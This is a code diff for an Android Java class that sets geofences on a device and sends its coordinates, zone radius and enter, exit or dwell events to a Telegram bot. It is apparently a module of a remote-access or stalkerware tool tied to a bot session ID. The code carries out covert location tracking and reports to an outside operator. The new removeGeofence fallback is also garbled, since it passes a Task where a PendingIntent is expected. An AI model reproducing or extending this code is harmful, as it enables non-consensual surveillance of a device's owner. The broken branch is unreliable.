@@ -14,6 +14,7 @@ public class GeofenceAlertManager {
     private Context context;
     private GeofencingClient geofencingClient;
     private static final String GEOFENCE_ID = "REX_GEOFENCE_1";
+    private PendingIntent geofencePendingIntent;
 
     public GeofenceAlertManager(Context context) {
         this.context = context;
@@ -35,22 +36,33 @@ public class GeofenceAlertManager {
                 .build();
 
             Intent intent = new Intent(context, GeofenceBroadcastReceiver.class);
-            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent,
+            geofencePendingIntent = PendingIntent.getBroadcast(context, 0, intent,
                 PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
 
-            geofencingClient.addGeofences(request, pendingIntent).addOnSuccessListener(aVoid ->
-                TelegramApi.sendMessage("🗺 Geofence set at " + lat + "," + lng + " radius " + radius + "m.")
-            ).addOnFailureListener(e ->
-                TelegramApi.sendMessage("❌ Geofence error: " + e.getMessage())
-            );
+            geofencingClient.addGeofences(request, geofencePendingIntent)
+                .addOnSuccessListener(aVoid ->
+                    TelegramApi.sendMessage("🗺 Geofence set at " + lat + "," + lng + " radius " + radius + "m."))
+                .addOnFailureListener(e ->
+                    TelegramApi.sendMessage("❌ Geofence error: " + e.getMessage()));
         } catch (Exception e) {
             TelegramApi.sendMessage("❌ Geofence requires Google Play Services.");
         }
     }
 
     public void removeGeofence() {
-        geofencingClient.removeGeofences(LocationServices.getGeofencingClient(context).removeGeofences(null));
-        TelegramApi.sendMessage("🗺 Geofence removed.");
+        if (geofencePendingIntent != null) {
+            geofencingClient.removeGeofences(geofencePendingIntent)
+                .addOnSuccessListener(aVoid ->
+                    TelegramApi.sendMessage("🗺 Geofence removed."))
+                .addOnFailureListener(e ->
+                    TelegramApi.sendMessage("❌ Remove error: " + e.getMessage()));
+        } else {
+            // Hapus semua geofence yang terdaftar jika tidak ada referensi intent
+            geofencingClient.removeGeofences(LocationServices.getGeofencingClient(context)
+                .removeGeofences(geofencePendingIntent != null ? geofencePendingIntent : PendingIntent.getBroadcast(context, 0, 
+                    new Intent(context, GeofenceBroadcastReceiver.class), 
+                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT)));
+        }
     }
 
     public static class GeofenceBroadcastReceiver extends android.content.BroadcastReceiver {
@@ -58,10 +70,21 @@ public class GeofenceAlertManager {
         public void onReceive(Context context, Intent intent) {
             com.google.android.gms.location.GeofencingEvent event =
                 com.google.android.gms.location.GeofencingEvent.fromIntent(intent);
-            if (event != null && !event.getGeofenceTransitionDetails().isEmpty()) {
+            if (event != null && event.hasError()) {
+                TelegramApi.sendMessage("❌ Geofence error code: " + event.getErrorCode());
+                return;
+            }
+            if (event != null) {
                 int transition = event.getGeofenceTransition();
-                String type = (transition == Geofence.GEOFENCE_TRANSITION_ENTER) ? "ENTER" :
-                             (transition == Geofence.GEOFENCE_TRANSITION_EXIT) ? "EXIT" : "UNKNOWN";
+                String type = "UNKNOWN";
+                switch (transition) {
+                    case Geofence.GEOFENCE_TRANSITION_ENTER:
+                        type = "ENTER"; break;
+                    case Geofence.GEOFENCE_TRANSITION_EXIT:
+                        type = "EXIT"; break;
+                    case Geofence.GEOFENCE_TRANSITION_DWELL:
+                        type = "DWELL"; break;
+                }
                 TelegramApi.sendMessage("📍 Geofence Alert: Device " + type + " the zone.\nSession: " + BotConfig.SESSION_ID);
             }
         }
